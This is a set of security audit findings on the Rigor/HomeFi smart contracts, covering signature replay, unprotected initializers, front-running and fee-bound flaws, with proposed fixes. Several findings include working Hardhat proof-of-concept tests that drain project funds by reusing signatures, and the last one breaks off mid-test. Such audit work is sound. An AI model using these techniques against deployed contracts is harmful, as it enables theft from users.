# Lines of code  https://github.com/code-423n4/2022-08-rigor/blob/main/contracts/Project.sol#L887 https://github.com/code-423n4/2022-08-rigor/blob/main/contracts/Project.sol#L108-L115   # Vulnerability details  ## Impact It is possible to pass Signature Validity check with an SignatureDecoder.recoverKey() returns 0 whenever the builder and /or contractor have an existing approved hash for a data.  With occurrence of above, any user can call changeOrder or setComplete functions successfully after  user approves data hashes.   ## Tools Used Manual review  ## Recommended Mitigation Steps There should be a require check for `_recoveredSignature != 0` in checkSignatureValidity()
# Lines of code  https://github.com/code-423n4/2022-08-rigor/blob/5ab7ea84a1516cb726421ef690af5bc41029f88f/contracts/Community.sol#L509   # Vulnerability details  ## Impact  Since there is no nonce in the data decoded at the beginning of function `escrow`, a builder can call the function multiple times reducing their debt as much as they wish.  ## Proof of Concept  - A builder has a debt of $50,000 - A lender, a builder, and an escrow agent all ~~enter a bar~~ sign a message that will reduce the debt of the builder by $5,000, upon receipt of physical cash. - Function `escrow` is called and debt is reduced to $45,000. - The builder, using the same `_data` and `_signature` then calls `escrow` a further 9 times reducing their debt to zero.  ## Recommended Mitigation Steps  1. Similar to function `publishProject`, add a new field into the [ProjectDetails](https://github.com/code-423n4/2022-08-rigor/blob/5ab7ea84a1516cb726421ef690af5bc41029f88f/contracts/interfaces/ICommunity.sol#L19-L32) struct called `escrowNonce`.  2. Modify function `escrow` to check this nonce and update it after the debt has been reduced.  See the diff below for full changes.  ```diff diff --git a/contracts/Community.sol b/contracts/Community.sol index 1585670..b834d0e 100644 --- a/contracts/Community.sol +++ b/contracts/Community.sol @@ -15,7 +15,7 @@ import {SignatureDecoder} from "./libraries/SignatureDecoder.sol";   /**   * @title Community Contract for HomeFi v2.5.0 - +   * @notice Module for coordinating lending groups on HomeFi protocol   */  contract Community is @@ -520,10 +520,11 @@ contract Community is              address _agent,              address _project,              uint256 _repayAmount, +            uint256 _escrowNonce,              bytes memory _details          ) = abi.decode(                  _data, -                (uint256, address, address, address, address, uint256, bytes) +                (uint256, address, address, address, address, uint256, uint256, bytes)              );           // Compute hash from bytes @@ -540,6 +541,12 @@ contract Community is              _lender == _communities[_communityID].owner,              "Community::!Owner"          ); +        ProjectDetails storage _communityProject = +          _communities[_communityID].projectDetails[_project]; +        require( +            _escrowNonce == _communityProject.escrowNonce, +            "Community::invalid escrowNonce" +        );           // check signatures          checkSignatureValidity(_lender, _hash, _signature, 0); // must be lender @@ -548,6 +555,7 @@ contract Community is           // Internal call to reduce debt          _reduceDebt(_communityID, _project, _repayAmount, _details); +        _communityProject.escrowNonce = _communityProject.escrowNonce + 1;          emit DebtReducedByEscrow(_agent);      }  diff --git a/contracts/interfaces/ICommunity.sol b/contracts/interfaces/ICommunity.sol index c45bbf0..652f51c 100644 --- a/contracts/interfaces/ICommunity.sol +++ b/contracts/interfaces/ICommunity.sol @@ -29,6 +29,7 @@ interface ICommunity {          uint256 lentAmount; // current principal lent to project (needs to be repaid by project's builder)          uint256 interest; // total accrued interest on `lentAmount`          uint256 lastTimestamp; // timestamp when last lending / repayment was made +        uint256 escrowNonce; // signing nonce to use when reducing debt by escrow      } ```
# Lines of code  https://github.com/code-423n4/2022-08-rigor/blob/5ab7ea84a1516cb726421ef690af5bc41029f88f/contracts/Project.sol#L386-L490 https://github.com/code-423n4/2022-08-rigor/blob/5ab7ea84a1516cb726421ef690af5bc41029f88f/contracts/Project.sol#L330-L359 https://github.com/code-423n4/2022-08-rigor/blob/5ab7ea84a1516cb726421ef690af5bc41029f88f/contracts/libraries/Tasks.sol#L153-L164   # Vulnerability details   This attack path is the results of signatures reusing in 2 functions - `changeOrder()` and `setComplete()`, and a missing modifier at `Tasks.unApprove()` library function.  ## Impact  ### Draining the project from funds  Current or previous subcontractor of a task can drain the project out of its funds by running `setComplete()` multiple times.  This can be exploited in 3 scenarios: * The price of a task was changed to a price higher than available funds (i.e. `totalLent - _totalAllocated`, and therefore gets unapproved), and than changed back to the original price (or any price that's not higher than available funds) * The subcontractor for a task was changed via `changeOrder` and then changed back to the original subcontractor      * e.g. - Bob was the original SC, it was changed to Alice, and then back to Bob * Similar to the case above, but even if the current SC is different from the original SC - it can still work if the current and previous SCs are teaming up to run the attack      * e.g. Bob was the original SC, it was changed to Alice, and changed again to Eve. And now Alice and Eve are teaming up to drain funds from the project  After `setComplete()` ran once by the legitimate users (i.e. signed by contractor, SC and builder), the attackers can now run it multiple times: * Reuse signatures to run `changeOrder()` - changing SC or setting the price to higher than available funds     * The only signer that might change is the subcontractor, he's either teaming up with the attacker (scenario #3) or he was the SC when it was first called (scenario #2) * In case of price change:     * change it back to the original price via `changeOrder()`, reusing signatures     * Run `allocateFunds()` to mark it as funded again * SC runs `acceptInvite()` to mark task as active * Run `setComplete()` reusing signatures     * If SC has changed - replace his signature with the current one (current SC should be one of the attackers) * Repeat till the project runs out of funds  ### Changing tasks costs/subcontractor by external users This can also be used by external users (you don't need to be builder/GC/SC in order to run `changeOrder()`) to troll the system (This still requires the task to be changed at least twice, otherwise re-running `changeOrder()` with the same data would have no effect).  * Changing the task cost up or down, getting the SC paid a different amount than intended (if it goes unnoticed, or front-run the `setComplete()` function) * Unapproving a task by setting a different SC or a price higher than available funds     * The legitimate users can change it back, but the attacker can change it again, both sides playing around till someone gets tired :)   ## Proof of Concept  Since the tests depend on each other, the PoC tests were created by adding them to the file `test/utils/projectTests.ts`, after the function `it('should be able to complete a task'` ( [Line 1143](https://github.com/code-423n4/2022-08-rigor/blob/5ab7ea84a1516cb726421ef690af5bc41029f88f/test/utils/projectTests.ts#L1143) ).  In the first test - a subcontractor is changed and then changed back. In the second scenario a price is changed to the new price (that is higher than the total available funds, and therefore is unapproved) and then back to its original price (it can actually be any price that is not higher than the available funds). In both cases I'm demonstrating how the project can be drained out of fund,   ```typescript    type DataType = {     types: string[];     values: (string | number)[];   };    it('PoC change SC', async () => {        const taskID = 1;     let taskDetails = await project.getTask(taskID);     const scBob = taskDetails.subcontractor;     const scAliceSigner = signers[4];     console.log({ scBob, alice: scAliceSigner.address });     const newCost = taskCost; // same as old     console.log(taskDetails);     // await (await project.inviteSC([taskID], [signers[2].address])).wait();      const changeToAliceData = {       types: ['uint256', 'address', 'uint256', 'address'],       values: [taskID, scAliceSigner.address, newCost, project.address],     };     const changeToAliceSignedData = await signData(changeToAliceData);      await changeSC(changeToAliceSignedData[0], changeToAliceSignedData[1]);      const changeToBobData = {       types: ['uint256', 'address', 'uint256', 'address'],       values: [taskID, scBob, newCost, project.address],     };     const changeToBobSignedData = await signData(changeToBobData);      await changeSC(changeToBobSignedData[0], changeToBobSignedData[1]);      const bobSigner = getSignerByAddress(signers, scBob);     await (await project.connect(bobSigner).acceptInviteSC([taskID])).wait();      // for some reason if you don't do this you get 'Mock on the method is not initialized' error     await mockDAIContract.mock.transfer       .withArgs(scAliceSigner.address, taskCost)       .returns(true);     await mockDAIContract.mock.transfer       .withArgs(scBob, taskCost)       .returns(true);     await mockDAIContract.mock.transfer       .withArgs(await homeFiContract.treasury(), taskCost / 1e3)       .returns(true);       const setCompleteData = {       types: ['uint256', 'address'],       values: [taskID, project.address],     };     let setCompleteSignedData = await signData(setCompleteData);     let tx = await project.setComplete(setCompleteSignedData[0], setCompleteSignedData[1]);     await expect(tx).to.emit(project, 'TaskComplete').withArgs(taskID);       // attack start     await changeSC(changeToAliceSignedData[0], changeToAliceSignedData[1]);      await (await project.connect(scAliceSigner).acceptInviteSC([taskID])).wait();      // the only thing that has changed is that alice became a subcontractor     // IRL Alice can simply take the old signatures and replace Bob's signature     // with her own signature     let aliceSetCompleteSignedData = await signData(setCompleteData);       tx = await project.setComplete(setCompleteSignedData[0], aliceSetCompleteSignedData[1]);     await expect(tx).to.emit(project, 'TaskComplete').withArgs(taskID);      await changeSC(changeToBobSignedData[0], changeToBobSignedData[1]);     await changeSC(changeToAliceSignedData[0], changeToAliceSignedData[1]);      await (await project.connect(scAliceSigner).acceptInviteSC([taskID])).wait();          tx = await project.setComplete(setCompleteSignedData[0], aliceSetCompleteSignedData[1]);     await expect(tx).to.emit(project, 'TaskComplete').withArgs(taskID);           async function signData(data: DataType) {       let contractor = await project.contractor();       let builder = await project.builder();       let taskDetails = await project.getTask(taskID);       let sc = taskDetails.subcontractor;       // console.log({ contractor, builder, sc })        let changeSignersAddress = [contractor, sc];       let contractorDelegated = await project.contractorDelegated();       if (!contractorDelegated) {         changeSignersAddress.unshift(builder);       }       changeSignersAddress = changeSignersAddress.filter(x => x !== ethers.constants.AddressZero);       const dataSigners = changeSignersAddress.map(signer => getSignerByAddress(signers, signer));        // console.log({ changeSignersAddress })       return await multisig(data, dataSigners);     }      async function changeSC(encodedData: string, signature: string) {       const tx = await project.changeOrder(encodedData, signature);       tx.wait();       await expect(tx).to.emit(project, 'ChangeOrderSC');     }   });     it('PoC change cost', async () => {     const taskID = 1;     let taskDetails = await project.getTask(taskID);     const originalSC = taskDetails.subcontractor;     const originalCost = taskCost;      const veryHighNewCost = taskCost * 10;     console.log(taskDetails);     // await (await project.inviteSC([taskID], [signers[2].address])).wait();      const changeToNewData = {       types: ['uint256', 'address', 'uint256', 'address'],       values: [taskID, originalSC, veryHighNewCost, project.address],     };     const changeToNewSignedData = await signData(changeToNewData);      await changeCost(changeToNewSignedData[0], changeToNewSignedData[1]);      const changeBackToOldData = {       types: ['uint256', 'address', 'uint256', 'address'],       values: [taskID, originalSC, originalCost, project.address],     };     const changeBackToOldSignedData = await signData(changeBackToOldData);      await changeCost(changeBackToOldSignedData[0], changeBackToOldSignedData[1]);     taskDetails = await project.getTask(taskID);      await expect(taskDetails.cost).to.be.equal(originalCost);      const originalSCSigner = getSignerByAddress(signers, originalSC);     await (await project.connect(originalSCSigner).acceptInviteSC([taskID])).wait();     await project.allocateFunds();      // for some reason if you don't do this you get 'Mock on the method is not initialized' error     await mockDAIContract.mock.transfer       .withArgs(originalSC, taskCost)       .returns(true);     await mockDAIContract.mock.transfer       .withArgs(await homeFiContract.treasury(), taskCost / 1e3)       .returns(true);       const setCompleteData = {       types: ['uint256', 'address'],       values: [taskID, project.address],     };     let setCompleteSignedData = await signData(setCompleteData);     let tx = await project.setComplete(setCompleteSignedData[0], setCompleteSignedData[1]);     await expect(tx).to.emit(project, 'TaskComplete').withArgs(taskID);       // attack start     await changeCost(changeToNewSignedData[0], changeToNewSignedData[1]);     await changeCost(changeBackToOldSignedData[0], changeBackToOldSignedData[1]);      await (await project.connect(originalSCSigner).acceptInviteSC([taskID])).wait();     await project.allocateFunds();        tx = await project.setComplete(setCompleteSignedData[0], setCompleteSignedData[1]);     await expect(tx).to.emit(project, 'TaskComplete').withArgs(taskID);      await changeCost(changeToNewSignedData[0], changeToNewSignedData[1]);     await changeCost(changeBackToOldSignedData[0], changeBackToOldSignedData[1]);      await (await project.connect(originalSCSigner).acceptInviteSC([taskID])).wait();     await project.allocateFunds();      tx = await project.setComplete(setCompleteSignedData[0], setCompleteSignedData[1]);     await expect(tx).to.emit(project, 'TaskComplete').withArgs(taskID);          async function signData(data: DataType) {       let contractor = await project.contractor();       let builder = await project.builder();       let taskDetails = await project.getTask(taskID);       let sc = taskDetails.subcontractor;       // console.log({ contractor, builder, sc })        let changeSignersAddress = [contractor, sc];       let contractorDelegated = await project.contractorDelegated();       if (!contractorDelegated) {         changeSignersAddress.unshift(builder);       }       changeSignersAddress = changeSignersAddress.filter(x => x !== ethers.constants.AddressZero);       const dataSigners = changeSignersAddress.map(signer => getSignerByAddress(signers, signer));        // console.log({ changeSignersAddress })       return await multisig(data, dataSigners);     }      async function changeCost(encodedData: string, signature: string) {       const tx = await project.changeOrder(encodedData, signature);       tx.wait();       // await expect(tx).to.emit(project, 'ChangeOrderSC');     }   });  ```  ## Tools Used Hardhat  ## Recommended Mitigation Steps  * Use nonce to protect `setComplete()` and `changeOrder()` from signatures reuse * Add the `onlyActive()` modifier to `Tasks.unApprove()` * Consider limiting `allocateFunds()` for builder only (this is not necessary to resolve the bug, just for hardening security)
# Lines of code  https://github.com/code-423n4/2022-08-rigor/blob/f2498c86dbd0e265f82ec76d9ec576442e896a87/contracts/Project.sol#L859   # Vulnerability details  ## Impact & Proof Of Concept When a contractor (let's say Bob) is also a subcontractor (which can be a valid scenario), it is not possible to use the hash approval feature for `checkSignatureTask`. The first call to `checkSignatureValidity` will already delete `approvedHashes[address(Bob)][_hash]`, the second call therefore fails.  Note that the same situation would also be possible for builder == contractor, or builder == subcontractor, although those situations are probably less likely to occur.  ## Recommended Mitigation Steps Delete the approval only when all checks are done.
# Lines of code  https://github.com/code-423n4/2022-08-rigor/blob/e35f5f61be9ff4b8dc5153e313419ac42964d1fd/contracts/Community.sol#L267   # Vulnerability details  ## Impact When a project is unpublished from a community, it can still owe money to this community (on which it needs to pay interest according to the specified APR). However, when the project is later published again in this community, the APR can be overwritten and the overwritten APR is used for the calculation of the interest for the old project (when it was unpublished).  ## Proof Of Concept 1.) Project A is published in community I with an APR of 3%. The community lends 1,000,000 USD to the project. 2.) Project A is unpublished, the `lentAmount` is still 1,000,000 USD. 3.) During one year, no calls to `repayLender`, `reduceDebt`, or `escrow` happens, i.e. the interest is never added and the `lastTimestamp` not updated. 4.) After one year, the project is published again in the same community. Because the FED raised interest rates, it is specified that the APR should be 5% from now on. 5.) Another $1,000,000 is lent to the project by calling `lendToProject`. Now, `claimInterest` is called which calculates the interest of the last year for the first million. However, the function already uses the new APR of 5%, meaning the added interest is 50,000 USD instead of the correct 30,000 USD.   ## Recommended Mitigation Steps When publishing a project, if the `lentAmount` for the community is non-zero, calculate the interest before updating the APR.
# Lines of code  https://github.com/code-423n4/2022-08-rigor/blob/e35f5f61be9ff4b8dc5153e313419ac42964d1fd/contracts/Community.sol#L175 https://github.com/code-423n4/2022-08-rigor/blob/e35f5f61be9ff4b8dc5153e313419ac42964d1fd/contracts/Community.sol#L213 https://github.com/code-423n4/2022-08-rigor/blob/e35f5f61be9ff4b8dc5153e313419ac42964d1fd/contracts/Community.sol#L530 https://github.com/code-423n4/2022-08-rigor/blob/f2498c86dbd0e265f82ec76d9ec576442e896a87/contracts/Disputes.sol#L91 https://github.com/code-423n4/2022-08-rigor/blob/f2498c86dbd0e265f82ec76d9ec576442e896a87/contracts/Project.sol#L142 https://github.com/code-423n4/2022-08-rigor/blob/f2498c86dbd0e265f82ec76d9ec576442e896a87/contracts/Project.sol#L167 https://github.com/code-423n4/2022-08-rigor/blob/f2498c86dbd0e265f82ec76d9ec576442e896a87/contracts/Project.sol#L235 https://github.com/code-423n4/2022-08-rigor/blob/f2498c86dbd0e265f82ec76d9ec576442e896a87/contracts/Project.sol#L286 https://github.com/code-423n4/2022-08-rigor/blob/f2498c86dbd0e265f82ec76d9ec576442e896a87/contracts/Project.sol#L346 https://github.com/code-423n4/2022-08-rigor/blob/f2498c86dbd0e265f82ec76d9ec576442e896a87/contracts/Project.sol#L402 https://github.com/code-423n4/2022-08-rigor/blob/f2498c86dbd0e265f82ec76d9ec576442e896a87/contracts/Project.sol#L499   # Vulnerability details  ## Impact & Proof Of Concepts In many places of the project (see affected code), untyped application data is directly hashed and signed. This is strongly disencouraged, as it enables different attacks (that each could be considered their own issue / vulnerability, but I submitted it as one, as they have all the same root cause):  1.) Signature reuse across different Rigor projects: While some signature contain the project address, not all do. For instance, `updateProjectHash` only contains a `_hash` and a `_nonce`. Therefore, we can have the following scenario: Bob is the owner of project A and signs / submit `updateProjectHash` with nonce 0 and some hash. Then, a project B that also has Bob as the owner is created. Attacker Charlie can simply take the `_data` and `_signature` that Bob previously submitted to project A and send it to project B. As this project will have a nonce of 0 (fresh created), it will accept it. `updateTaskHash` is also affected by this. 2.) Signature reuse across different chains: Because the chain ID is not included in the data, all signatures are also valid when the project is launched on a chain with another chain ID. For instance, let's say it is also launched on Polygon. An attacker can now use all of the Ethereum signatures there. Because the Polygon addresses of user's (and potentially contracts, when the nonces for creating are the same) are often identical, there can be situations where the payload is meaningful on both chains. 3.) Signature reuse across Rigor functions: Some functions accept and decode data / signatures that were intended for other functions. For instance, see this example of providing the data & signature that was intended for `inviteContractor` to `setComplete`: ```diff diff --git a/test/utils/projectTests.ts b/test/utils/projectTests.ts index ae9e202..752e01f 100644 --- a/test/utils/projectTests.ts +++ b/test/utils/projectTests.ts @@ -441,7 +441,7 @@ export const projectTests = async ({      }    });  -  it('should be able to invite contractor', async () => { +  it.only('should be able to invite contractor', async () => {      expect(await project.contractor()).to.equal(ethers.constants.AddressZero);      const data = {        types: ['address', 'address'], @@ -452,6 +452,7 @@ export const projectTests = async ({        signers[1],      ]);      const tx = await project.inviteContractor(encodedData, signature); +    const tx2 = await project.setComplete(encodedData, signature);      await expect(tx)        .to.emit(project, 'ContractorInvited')        .withArgs(signers[1].address); ``` While this reverts because there is no task that corresponds to the address that is signed there, this is not always the case. 4.) Signature reuse from different Ethereum projects & phishing Because the payload of these signatures is very generic (two addresses, a byte and two uints), there might be situations where a user has already signed data with the same format for a completely different Ethereum application. Furthermore, an attacker could set up a DApp that uses the same format and trick someone into signing the data. Even a very security-conscious owner that has audited the contract of this DApp (that does not have any vulnerabilities and is not malicious, it simply consumes signatures that happen to have the same format) might be willing to sign data for this DApp, as he does not anticipate that this puts his Rigor project in danger.  ## Recommended Mitigation Steps I strongly recommend to follow [EIP-712](https://eips.ethereum.org/EIPS/eip-712) and not implement your own standard / solution. While this also improves the user experience, this topic is very complex and not easy to get right, so it is recommended to use a battle-tested approach that people have thought in detail about. All of the mentioned attacks are not possible with EIP-712: 1.) There is always a domain separator that includes the contract address. 2.) The chain ID is included in the domain separator 3.) There is a type hash (of the function name / parameters) 4.) The domain separator does not allow reuse across different projects, phishing with an innocent DApp is no longer possible (it would be shown to the user that he is signing data for Rigor, which he would off course not do on a different site)
# Lines of code  https://github.com/code-423n4/2022-08-rigor/blob/main/contracts/HomeFi.sol#L92 https://github.com/code-423n4/2022-08-rigor/blob/main/contracts/HomeFi.sol#L113   # Vulnerability details  ## Impact The initialize function of the HomeFi contract does not emit the AdminReplaced event after setting the value of the  _msgSender() to be the admin.  Consider emitting events after sensitive changes occur to facilitate tracking and notify off-chain clients following the contractsâ€™ activity.  ## Proof of Concept  https://github.com/code-423n4/2022-08-rigor/blob/main/contracts/HomeFi.sol#L92 https://github.com/code-423n4/2022-08-rigor/blob/main/contracts/HomeFi.sol#L113  ## Tools Used vscode ## Recommended Mitigation Steps add event
# Lines of code  https://github.com/code-423n4/2022-08-rigor/blob/5ab7ea84a1516cb726421ef690af5bc41029f88f/contracts/HomeFiProxy.sol#L216-L230 https://github.com/code-423n4/2022-08-rigor/blob/5ab7ea84a1516cb726421ef690af5bc41029f88f/contracts/Community.sol#L102-L119 https://github.com/code-423n4/2022-08-rigor/blob/5ab7ea84a1516cb726421ef690af5bc41029f88f/contracts/DebtToken.sol#L43-L58 https://github.com/code-423n4/2022-08-rigor/blob/5ab7ea84a1516cb726421ef690af5bc41029f88f/contracts/Disputes.sol#L74-L81 https://github.com/code-423n4/2022-08-rigor/blob/5ab7ea84a1516cb726421ef690af5bc41029f88f/contracts/HomeFi.sol#L92-L120 https://github.com/code-423n4/2022-08-rigor/blob/5ab7ea84a1516cb726421ef690af5bc41029f88f/contracts/Project.sol#L94-L105 https://github.com/code-423n4/2022-08-rigor/blob/5ab7ea84a1516cb726421ef690af5bc41029f88f/contracts/ProjectFactory.sol#L45-L55   # Vulnerability details  ## Impact All next Impact depends on actions and attention from developers when deployed - Loss of funds  - Failure of the protocol, with the need for redeploy - Loss of control over protocol elements (some smart contracts) - The possibility of replacing contracts and settings with harmful ones And other things that come out of it...  ## Proof of Concept  For a proper understanding of Proof of Concept, you need to understand the following things: 1) Hardhat does not stop the process with a deploy and does not show failed transactions if they have occurred in some cases  2) Malicious agents can trace the protocol deployment transactions and insert their own transaction between them  Reason: - [During deploy TransparentUpgradeableProxy's](https://github.com/code-423n4/2022-08-rigor/blob/5ab7ea84a1516cb726421ef690af5bc41029f88f/contracts/HomeFiProxy.sol#L216-L230) initialize method for initializing contracts not called. The third parameter responsible for this is an empty string. This causes the initialization process itself to be **delayed**  - Contract initialization methods have no check over who calls them Example [ProjectFactory.sol#L45-L55](https://github.com/code-423n4/2022-08-rigor/blob/5ab7ea84a1516cb726421ef690af5bc41029f88f/contracts/ProjectFactory.sol#L45-L55)  **Also suitable for other contracts, strings are attached in Links to affected code **  Example of exploiting the vulnerability **Failure of the protocol, with the need for redeploy** && **Loss of control over protocol elements (some smart contracts)** : 1) User listen transaction in mempool, etherscan, transaction in block etc  2) Finds the moment of deployment and sends the transaction for setup his HomeFi address in Disputes contract:   Just he call initialize method and put his _homeFi parameter 3) In the event that hardhat tracked a failed transaction, the deployment will stop and you will need to start over. If the hardhead misses it and the developers do not check the result and the setting, access to this part will be lost and fix is needed  Example of exploiting the vulnerability **Loss of funds**: 1) User listen transaction in mempool, etherscan, transaction in block for listne when HomeFi will deployed 2) Send transaction for initialize [HomeFi](https://github.com/code-423n4/2022-08-rigor/blob/5ab7ea84a1516cb726421ef690af5bc41029f88f/contracts/HomeFi.sol#L92-L120) with his _treasury address 3) Transfer the admin ownership the right to the real address to divert the eyes 4) The address of the treasury remains with the attacker 5) The protocol fees (fee) will be [transfered](https://github.com/code-423n4/2022-08-rigor/blob/5ab7ea84a1516cb726421ef690af5bc41029f88f/contracts/Community.sol#L443) to the attacker's address until it is detected   ## Recommended Mitigation Steps  Carry out checks at the initialization stage or redesign the deployment process with the initialization of contracts during deployment  
# Lines of code  https://github.com/code-423n4/2022-08-rigor/blob/main/contracts/Community.sol#L392-L394 https://github.com/code-423n4/2022-08-rigor/blob/main/contracts/HomeFi.sol#L184-L197   # Vulnerability details  # Missing upper limit definition in `replaceLenderFee()` of `HomeFi.sol`  ## Impact The admin of the `HomeFi` contract can set `lenderFee` to greater than 100%, forcing calls to `lendToProject()` to all projects created in the future to revert.  ## Proof of Concept Using the function `replaceLenderFee()`, admins of the `HomeFi` contract can set `lenderFee` to any arbitrary `uint256` value: ```solidity  185:        function replaceLenderFee(uint256 _newLenderFee)  186:            external  187:            override  188:            onlyAdmin  189:        {  190:            // Revert if no change in lender fee  191:            require(lenderFee != _newLenderFee, "HomeFi::!Change");  192:      193:            // Reset variables  194:            lenderFee = _newLenderFee;  195:      196:            emit LenderFeeReplaced(_newLenderFee);  197:        } ```  New projects that are created will then get its `lenderFee` from the `HomeFi` contract. When communities wish to lend to these projects, it calls `lendToProject()`, which has the following calculation: ```solidity  392:        // Calculate lenderFee  393:        uint256 _lenderFee = (_lendingAmount * _projectInstance.lenderFee()) /  394:            (_projectInstance.lenderFee() + 1000); ``` If `lenderFee` a large value, such as `type(uint256).max`, the calculation shown above to overflow. This prevents any community from lending to any new projects.   ## Recommended Mitigation Steps Consider adding a reasonable fee rate bounds checks in the `replaceLenderFee()` function. This would prevent potential griefing and increase the trust of users in the contract.
# Lines of code  https://github.com/code-423n4/2022-08-rigor/blob/5ab7ea84a1516cb726421ef690af5bc41029f88f/contracts/Project.sol#L295-L316   # Vulnerability details  Malicious builder/contractor can change the subcontractor for any task even if all the terms was agreed upon and work was started/finished, but the task wasn't set to completed yet, i.e. it's `SCConfirmed`, `getAlerts(_taskID)[2] == true`. This condition is not checked by inviteSC().  For example, a contractor can create a subcontractor of her own and front run valid setComplete() call with a sequence of `inviteSC(task, own_subcontractor) -> setComplete()` with a signatory from the `own_subcontractor`, stealing the task budget from the subcontractor who did the job. Contractor will not breach any duties with the community as the task will be done, while raiseDispute() will not work for a real subcontractor as the task record will be already changed.  Setting the severity to be high as this creates an attack vector to fully steal task budget from the subcontractor as at the moment of any valid setComplete() call the task budget belongs to subcontractor as the job completion is already verified by all the parties.  ## Proof of Concept  inviteSC() requires either builder or contractor to call for the change and verify nothing else:  https://github.com/code-423n4/2022-08-rigor/blob/5ab7ea84a1516cb726421ef690af5bc41029f88f/contracts/Project.sol#L295-L316  ```solidity     /// @inheritdoc IProject     function inviteSC(uint256[] calldata _taskList, address[] calldata _scList)         external         override     {         // Revert if sender is neither builder nor contractor.         require(             _msgSender() == builder || _msgSender() == contractor,             "Project::!Builder||!GC"         );          // Revert if taskList array length not equal to scList array length.         uint256 _length = _taskList.length;         require(_length == _scList.length, "Project::Lengths !match");          // Invite subcontractor for each task.         for (uint256 i = 0; i < _length; i++) {             _inviteSC(_taskList[i], _scList[i], false);         }          emit MultipleSCInvited(_taskList, _scList);     } ```  _inviteSC() only checks non-zero address and calls inviteSubcontractor():  https://github.com/code-423n4/2022-08-rigor/blob/5ab7ea84a1516cb726421ef690af5bc41029f88f/contracts/Project.sol#L747-L762  ```solidity     function _inviteSC(         uint256 _taskID,         address _sc,         bool _emitEvent     ) internal {         // Revert if sc to invite is address 0         require(_sc != address(0), "Project::0 address");          // Internal call to tasks invite contractor         tasks[_taskID].inviteSubcontractor(_sc);          // If `_emitEvent` is true (called via changeOrder) then emit event         if (_emitEvent) {             emit SingleSCInvited(_taskID, _sc);         }     } ```  inviteSubcontractor() just sets the new value:  https://github.com/code-423n4/2022-08-rigor/blob/5ab7ea84a1516cb726421ef690af5bc41029f88f/contracts/libraries/Tasks.sol#L106-L111  ```solidity     function inviteSubcontractor(Task storage _self, address _sc)         internal         onlyInactive(_self)     {         _self.subcontractor = _sc;     } ```  Task is paid only on completion by setComplete():  https://github.com/code-423n4/2022-08-rigor/blob/5ab7ea84a1516cb726421ef690af5bc41029f88f/contracts/Project.sol#L349-L356  ```solidity         // Mark task as complete. Only works when task is active.         tasks[_taskID].setComplete();          // Transfer funds to subcontractor.         currency.safeTransfer(             tasks[_taskID].subcontractor,             tasks[_taskID].cost         ); ```  This way the absence of `getAlerts(_taskID)[2]` check and checkSignatureTask() call in inviteSC() provides a way for builder or contractor to steal task budget from a subcontractor.   ## Recommended Mitigation Steps  Consider calling checkSignatureTask() when `getAlerts(_taskID)[2]` is true, schematically:  https://github.com/code-423n4/2022-08-rigor/blob/5ab7ea84a1516cb726421ef690af5bc41029f88f/contracts/Project.sol#L310-L313  ```solidity         // Invite subcontractor for each task.         for (uint256 i = 0; i < _length; i++) { +           if (getAlerts(_taskList[i])[2]) +               checkSignatureTask(_data_with_scList[i], _signature, _taskList[i]);                     _inviteSC(_taskList[i], _scList[i], false);         } ```  This approach is already implemented in changeOrder() where `_newSC` is a part of hash that has to be signed by all the parties:  https://github.com/code-423n4/2022-08-rigor/blob/5ab7ea84a1516cb726421ef690af5bc41029f88f/contracts/Project.sol#L386-L403  ```solidity     function changeOrder(bytes calldata _data, bytes calldata _signature)         external         override         nonReentrant     {         // Decode params from _data         (             uint256 _taskID,             address _newSC,             uint256 _newCost,             address _project         ) = abi.decode(_data, (uint256, address, uint256, address));          // If the sender is disputes contract, then do not check for signatures.         if (_msgSender() != disputes) {             // Check for required signatures.             checkSignatureTask(_data, _signature, _taskID);         } ```  https://github.com/code-423n4/2022-08-rigor/blob/5ab7ea84a1516cb726421ef690af5bc41029f88f/contracts/Project.sol#L477-L481  ```solidity             // If new subcontractor is not zero address.             if (_newSC != address(0)) {                 // Invite the new subcontractor for the task.                 _inviteSC(_taskID, _newSC, true);             } ```  checkSignatureTask() checks all the signatures:  https://github.com/code-423n4/2022-08-rigor/blob/5ab7ea84a1516cb726421ef690af5bc41029f88f/contracts/Project.sol#L855-L861  ```solidity             // When builder has not delegated rights to contractor             else {                 // Check for B, SC and GC signatures                 checkSignatureValidity(builder, _hash, _signature, 0);                 checkSignatureValidity(contractor, _hash, _signature, 1);                 checkSignatureValidity(_sc, _hash, _signature, 2);             } ```  
# Lines of code  https://github.com/code-423n4/2022-08-rigor/blob/5ab7ea84a1516cb726421ef690af5bc41029f88f/contracts/Project.sol#L162   # Vulnerability details  In Project.sol, function `updateProjectHash` L162, `_data` (which is signed by builder and/or contractor) does not contain a reference to the project address. In all other external functions of Project.sol, `_data` contains the address of the project, used in this check:  ```require(_projectAddress == address(this), "Project::!projectAddress");```. The lack of this verification makes it possible to reuse the same `_data`, and the same `_signature` on another project, in the case the latter has the same builder and/or contractor, and the same `_nonce`. In pratice, if the same group of people starts a new project, when `_nonce` reaches the correct value, anyone can change the hash of a task (if we suppose that that `updateTaskHash()` was used in the previous project).
# Lines of code  https://github.com/code-423n4/2022-08-rigor/blob/5ab7ea84a1516cb726421ef690af5bc41029f88f/contracts/Project.sol#L493-L536   # Vulnerability details   ## Impact In case users are using a contract (like a multisig wallet) to interact with a project, they can't raise a dispute.  The sponsors have added the `approveHash()` function to support users who wish to use contracts as builder/GC/SC. However, the `Project.raiseDispute()` function doesn't check them, meaning if any of those users wish to raise a dispute they can't do it.  ## Proof of Concept I've modified [the following test](https://github.com/code-423n4/2022-08-rigor/blob/5ab7ea84a1516cb726421ef690af5bc41029f88f/test/utils/disputeTests.ts#L179-L215), trying to use an approved hash. The test failed.  ```typescript   it('Builder can raise addTasks() dispute', async () => {       let expected = 2;       const actionValues = [         [exampleHash],         [100000000000],         expected,         projectAddress,       ];       // build and raise dispute transaction       const [encodedData, signature] = await makeDispute(         projectAddress,         0,         1,         actionValues,         signers[0],         '0x4222',       );       const encodedMsgHash = ethers.utils.keccak256(encodedData);       await project.connect(signers[0]).approveHash(encodedMsgHash);       let tx = await project         .connect(signers[1])         .raiseDispute(encodedData, "0x");       // expect event       await expect(tx)         .to.emit(disputesContract, 'DisputeRaised')         .withArgs(1, '0x4222');       // expect dispute raise to store info       const _dispute = await disputesContract.disputes(1);       const decodedAction = abiCoder.decode(types.taskAdd, _dispute.actionData);       expect(_dispute.status).to.be.equal(1);       expect(_dispute.taskID).to.be.equal(0);       expect(decodedAction[0][0]).to.be.equal(exampleHash);       expect(decodedAction[1][0]).to.be.equal(100000000000);       expect(decodedAction[2]).to.be.equal(expected);       